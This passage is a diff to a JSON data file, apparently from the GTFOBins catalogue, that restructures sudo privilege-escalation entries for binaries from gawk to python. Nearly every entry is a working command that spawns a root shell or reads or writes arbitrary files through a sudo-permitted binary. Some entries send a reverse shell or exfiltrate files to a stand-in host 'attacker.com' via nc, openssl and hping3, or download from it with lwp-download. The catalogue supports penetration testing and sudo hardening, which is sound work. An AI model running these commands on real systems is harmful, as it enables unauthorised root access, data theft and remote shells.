+            "code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
+        }
     ],
     "gcc": [
-        "sudo gcc -wrapper /bin/sh,-s ."
+        {
+            "code": "sudo gcc -wrapper /bin/sh,-s ."
+        }
     ],
     "gcloud": [
-        "sudo gcloud help\n!/bin/sh\n"
+        {
+            "code": "sudo gcloud help\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "gcore": [
-        "sudo gcore $PID"
+        {
+            "code": "sudo gcore $PID"
+        }
     ],
     "gdb": [
-        "sudo gdb -nx -ex '!sh' -ex quit"
+        {
+            "code": "sudo gdb -nx -ex '!sh' -ex quit"
+        }
     ],
     "gem": [
-        "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
+        {
+            "code": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc",
+            "description": "This requires the name of an installed gem to be provided (`rdoc` is usually installed)."
+        }
     ],
     "genie": [
-        "sudo genie -c '/bin/sh'"
+        {
+            "code": "sudo genie -c '/bin/sh'"
+        }
     ],
     "genisoimage": [
-        "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
+        }
     ],
     "ghc": [
-        "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
+        {
+            "code": "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
+        }
     ],
     "ghci": [
-        "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
+        {
+            "code": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
+        }
     ],
     "gimp": [
-        "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
+        {
+            "code": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
+        }
     ],
     "ginsh": [
-        "sudo ginsh\n!/bin/sh\n"
+        {
+            "code": "sudo ginsh\n!/bin/sh\n"
+        }
     ],
     "git": [
-        "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
-        "sudo git -p help config\n!/bin/sh\n",
-        "sudo git branch --help config\n!/bin/sh\n",
-        "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
-        "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
+        {
+            "code": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
+        },
+        {
+            "code": "sudo git -p help config\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        },
+        {
+            "code": "sudo git branch --help config\n!/bin/sh\n",
+            "description": "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        },
+        {
+            "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
+            "description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option."
+        },
+        {
+            "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
+        }
     ],
     "grc": [
-        "sudo grc --pty /bin/sh"
+        {
+            "code": "sudo grc --pty /bin/sh"
+        }
     ],
     "grep": [
-        "LFILE=file_to_read\nsudo grep '' $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo grep '' $LFILE\n"
+        }
     ],
     "gtester": [
-        "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+        {
+            "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+        }
     ],
     "gzip": [
-        "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
+        {
+            "code": "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
+        }
     ],
     "hd": [
-        "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
+        }
     ],
     "head": [
-        "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
+        }
     ],
     "hexdump": [
-        "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
+        }
     ],
     "highlight": [
-        "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
+        }
     ],
     "hping3": [
-        "sudo hping3\n/bin/sh\n",
-        "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n"
+        {
+            "code": "sudo hping3\n/bin/sh\n"
+        },
+        {
+            "code": "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n",
+            "description": "The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n```\nsudo hping3 --icmp --listen xxx --dump\n```\n"
+        }
     ],
     "iconv": [
-        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
+        }
     ],
     "iftop": [
-        "sudo iftop\n!/bin/sh\n"
+        {
+            "code": "sudo iftop\n!/bin/sh\n"
+        }
     ],
     "install": [
-        "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
+        {
+            "code": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
+        }
     ],
     "ionice": [
-        "sudo ionice /bin/sh"
+        {
+            "code": "sudo ionice /bin/sh"
+        }
     ],
     "ip": [
-        "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n",
-        "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
-        "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n"
+        },
+        {
+            "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
+            "description": "This only works for Linux with CONFIG_NET_NS=y."
+        },
+        {
+            "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n",
+            "description": "This only works for Linux with CONFIG_NET_NS=y. This version also grants network access."
+        }
     ],
     "irb": [
-        "sudo irb\nexec '/bin/bash'\n"
+        {
+            "code": "sudo irb\nexec '/bin/bash'\n"
+        }
     ],
     "ispell": [
-        "sudo ispell /etc/passwd\n!/bin/sh\n"
+        {
+            "code": "sudo ispell /etc/passwd\n!/bin/sh\n"
+        }
     ],
     "jjs": [
-        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
+        {
+            "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
+        }
     ],
     "joe": [
-        "sudo joe\n^K!/bin/sh\n"
+        {
+            "code": "sudo joe\n^K!/bin/sh\n"
+        }
     ],
     "join": [
-        "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
+        }
     ],
     "journalctl": [
-        "sudo journalctl\n!/bin/sh\n"
+        {
+            "code": "sudo journalctl\n!/bin/sh\n"
+        }
     ],
     "jq": [
-        "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
+        }
     ],
     "jrunscript": [
-        "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
+        {
+            "code": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
+        }
     ],
     "jtag": [
-        "sudo jtag --interactive\nshell /bin/sh\n"
+        {
+            "code": "sudo jtag --interactive\nshell /bin/sh\n"
+        }
     ],
     "julia": [
-        "sudo julia -e 'run(`/bin/sh`)'\n"
+        {
+            "code": "sudo julia -e 'run(`/bin/sh`)'\n"
+        }
     ],
     "knife": [
-        "sudo knife exec -E 'exec \"/bin/sh\"'\n"
+        {
+            "code": "sudo knife exec -E 'exec \"/bin/sh\"'\n"
+        }
     ],
     "ksh": [
-        "sudo ksh"
+        {
+            "code": "sudo ksh"
+        }
     ],
     "ksshell": [
-        "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
+        }
     ],
     "ksu": [
-        "sudo ksu -q -e /bin/sh"
+        {
+            "code": "sudo ksu -q -e /bin/sh"
+        }
     ],
     "kubectl": [
-        "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+        {
+            "code": "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+        }
     ],
     "latex": [
-        "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
-        "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+        {
+            "code": "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
+            "description": "The read file will be part of the output."
+        },
+        {
+            "code": "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+        }
     ],
     "latexmk": [
-        "sudo latexmk -e 'exec \"/bin/sh\";'"
+        {
+            "code": "sudo latexmk -e 'exec \"/bin/sh\";'"
+        }
     ],
     "ld.so": [
-        "sudo /lib/ld.so /bin/sh"
+        {
+            "code": "sudo /lib/ld.so /bin/sh"
+        }
     ],
     "ldconfig": [
-        "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
+        {
+            "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n",
+            "description": "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries."
+        }
     ],
     "less": [
-        "sudo less /etc/profile\n!/bin/sh\n"
+        {
+            "code": "sudo less /etc/profile\n!/bin/sh\n"
+        }
     ],
     "lftp": [
-        "sudo lftp -c '!/bin/sh'"
+        {
+            "code": "sudo lftp -c '!/bin/sh'"
+        }
     ],
     "ln": [
-        "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
+        {
+            "code": "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
+        }
     ],
     "loginctl": [
-        "sudo loginctl user-status\n!/bin/sh\n"
+        {
+            "code": "sudo loginctl user-status\n!/bin/sh\n"
+        }
     ],
     "logsave": [
-        "sudo logsave /dev/null /bin/sh -i"
+        {
+            "code": "sudo logsave /dev/null /bin/sh -i"
+        }
     ],
     "look": [
-        "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
+        }
     ],
     "ltrace": [
-        "sudo ltrace -b -L /bin/sh"
+        {
+            "code": "sudo ltrace -b -L /bin/sh"
+        }
     ],
     "lua": [
-        "sudo lua -e 'os.execute(\"/bin/sh\")'"
+        {
+            "code": "sudo lua -e 'os.execute(\"/bin/sh\")'"
+        }
     ],
     "lualatex": [
-        "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
+        {
+            "code": "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
+        }
     ],
     "luatex": [
-        "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
+        {
+            "code": "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
+        }
     ],
     "lwp-download": [
-        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
+        {
+            "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
+        }
     ],
     "lwp-request": [
-        "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
+        }
     ],
     "mail": [
-        "sudo mail --exec='!/bin/sh'"
+        {
+            "code": "sudo mail --exec='!/bin/sh'",
+            "description": "GNU version only."
+        }
     ],
     "make": [
-        "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
+        {
+            "code": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
+        }
     ],
     "man": [
-        "sudo man man\n!/bin/sh\n"
+        {
+            "code": "sudo man man\n!/bin/sh\n"
+        }
     ],
     "mawk": [
-        "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
+        {
+            "code": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
+        }
     ],
     "minicom": [
-        "sudo minicom -D /dev/null\n"
+        {
+            "code": "sudo minicom -D /dev/null\n",
+            "description": "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n"
+        }
     ],
     "more": [
-        "TERM= sudo more /etc/profile\n!/bin/sh\n"
+        {
+            "code": "TERM= sudo more /etc/profile\n!/bin/sh\n"
+        }
     ],
     "mosquitto": [
-        "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n"
+        }
     ],
     "mount": [
-        "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
+        {
+            "code": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n",
+            "description": "Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell."
+        }
     ],
     "msfconsole": [
-        "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
+        {
+            "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
+        }
     ],
     "msgattrib": [
-        "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
+        }
     ],
     "msgcat": [
-        "LFILE=file_to_read\nsudo msgcat -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo msgcat -P $LFILE\n"
+        }
     ],
     "msgconv": [
-        "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
+        }
     ],
     "msgfilter": [
-        "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n"
+        {
+            "code": "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n",
+            "description": "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
+        }
     ],
     "msgmerge": [
-        "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
+        {
+            "code": "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
+        }
     ],
     "msguniq": [
-        "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
+        }
     ],
     "mtr": [
-        "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
+        }
     ],
     "multitime": [
-        "sudo multitime /bin/sh"
+        {
+            "code": "sudo multitime /bin/sh"
+        }
     ],
     "mv": [
-        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
+        {
+            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
+        }
     ],
     "mysql": [
-        "sudo mysql -e '\\! /bin/sh'"
+        {
+            "code": "sudo mysql -e '\\! /bin/sh'"
+        }
     ],
     "nano": [
-        "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
+        {
+            "code": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
+        }
     ],
     "nasm": [
-        "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
+        }
     ],
     "nawk": [
-        "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
+        {
+            "code": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
+        }
     ],
     "nc": [
-        "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
+        {
+            "code": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n",
+            "description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
+        }
     ],
     "ncftp": [
-        "sudo ncftp\n!/bin/sh\n"
+        {
+            "code": "sudo ncftp\n!/bin/sh\n"
+        }
     ],
     "neofetch": [
-        "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
+        {
+            "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
+        }
     ],
     "nft": [
-        "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
+        }
     ],
     "nice": [
-        "sudo nice /bin/sh"
+        {
+            "code": "sudo nice /bin/sh"
+        }
     ],
     "nl": [
-        "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
+        }
     ],
     "nm": [
-        "LFILE=file_to_read\nsudo nm @$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo nm @$LFILE\n"
+        }
     ],
     "nmap": [
-        "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
-        "sudo nmap --interactive\nnmap> !sh\n"
+        {
+            "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
+            "description": "Input echo is disabled."
+        },
+        {
+            "code": "sudo nmap --interactive\nnmap> !sh\n",
+            "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
+        }
     ],
     "node": [
-        "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
+        {
+            "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
+        }
     ],
     "nohup": [
-        "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
+        {
+            "code": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
+        }
     ],
     "npm": [
-        "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"
+        {
+            "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n",
+            "description": "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
+        }
     ],
     "nroff": [
-        "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
+        {
+            "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
+        }
     ],
     "nsenter": [
-        "sudo nsenter /bin/sh"
+        {
+            "code": "sudo nsenter /bin/sh"
+        }
     ],
     "octave": [
-        "sudo octave-cli --eval 'system(\"/bin/sh\")'"
+        {
+            "code": "sudo octave-cli --eval 'system(\"/bin/sh\")'"
+        }
     ],
     "od": [
-        "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
+        }
     ],
     "openssl": [
-        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
+        {
+            "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
+            "description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n"
+        }
     ],
     "openvpn": [
-        "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
-        "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n"
+        {
+            "code": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"
+        },
+        {
+            "code": "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n",
+            "description": "The file is actually parsed and the first partial wrong line is returned in an error message."
+        }
     ],
     "openvt": [
-        "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n"
+        {
+            "code": "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n",
+            "description": "The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file."
+        }
     ],
     "opkg": [
-        "sudo opkg install x_1.0_all.deb\n"
+        {
+            "code": "sudo opkg install x_1.0_all.deb\n",
+            "description": "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n"
+        }
     ],
     "pandoc": [
-        "LFILE=file_to_write\necho DATA | sudo pandoc -t plain -o \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\necho DATA | sudo pandoc -t plain -o \"$LFILE\"\n"
+        }
     ],
     "paste": [
-        "LFILE=file_to_read\nsudo paste $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo paste $LFILE\n"
+        }
     ],
     "pdb": [
-        "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
+        {
+            "code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
+        }
     ],
     "pdflatex": [
-        "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
-        "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+        {
+            "code": "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
+            "description": "The read file will be part of the output."
+        },
+        {
+            "code": "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+        }
     ],
     "pdftex": [
-        "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
+        {
+            "code": "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
+        }
     ],
     "perf": [
-        "sudo perf stat /bin/sh\n"
+        {
+            "code": "sudo perf stat /bin/sh\n"
+        }
     ],
     "perl": [
-        "sudo perl -e 'exec \"/bin/sh\";'"
+        {
+            "code": "sudo perl -e 'exec \"/bin/sh\";'"
+        }
     ],
     "perlbug": [
-        "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
+        {
+            "code": "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
+        }
     ],
     "pexec": [
-        "sudo pexec /bin/sh"
+        {
+            "code": "sudo pexec /bin/sh"
+        }
     ],
     "pg": [
-        "sudo pg /etc/profile\n!/bin/sh\n"
+        {
+            "code": "sudo pg /etc/profile\n!/bin/sh\n"
+        }
     ],
     "php": [
-        "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
+        {
+            "code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
+        }
     ],
     "pic": [
-        "sudo pic -U\n.PS\nsh X sh X\n"
+        {
+            "code": "sudo pic -U\n.PS\nsh X sh X\n"
+        }
     ],
     "pico": [
-        "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
+        {
+            "code": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
+        }
     ],
     "pidstat": [
-        "COMMAND=id\nsudo pidstat -e $COMMAND\n"
+        {
+            "code": "COMMAND=id\nsudo pidstat -e $COMMAND\n"
+        }
     ],
     "pip": [
-        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
+        {
+            "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
+        }
     ],
     "pkexec": [
-        "sudo pkexec /bin/sh"
+        {
+            "code": "sudo pkexec /bin/sh"
+        }
     ],
     "pkg": [
-        "sudo pkg install -y --no-repo-update ./x-1.0.txz\n"
+        {
+            "code": "sudo pkg install -y --no-repo-update ./x-1.0.txz\n",
+            "description": "It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n```\n"
+        }
     ],
     "posh": [
-        "sudo posh"
+        {
+            "code": "sudo posh"
+        }
     ],
     "pr": [
-        "LFILE=file_to_read\npr -T $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\npr -T $LFILE\n"
+        }
     ],
     "pry": [
-        "sudo pry\nsystem(\"/bin/sh\")\n"
+        {
+            "code": "sudo pry\nsystem(\"/bin/sh\")\n"
+        }
     ],
     "psftp": [
-        "sudo psftp\n!/bin/sh\n"
+        {
+            "code": "sudo psftp\n!/bin/sh\n"
+        }
     ],
     "psql": [
-        "psql\n\\?\n!/bin/sh\n"
+        {
+            "code": "psql\n\\?\n!/bin/sh\n"
+        }
     ],
     "ptx": [
-        "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
+        }
     ],
     "puppet": [
-        "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
+        {
+            "code": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
+        }
     ],
     "pwsh": [
-        "sudo pwsh"
+        {
+            "code": "sudo pwsh"
+        }
     ],
     "python": [
-        "sudo python -c 'import os; os.system(\"/bin/sh\")'"
+        {
+            "code": "sudo python -c 'import os; os.system(\"/bin/sh\")'"
+        }
     ],
     "rake": [
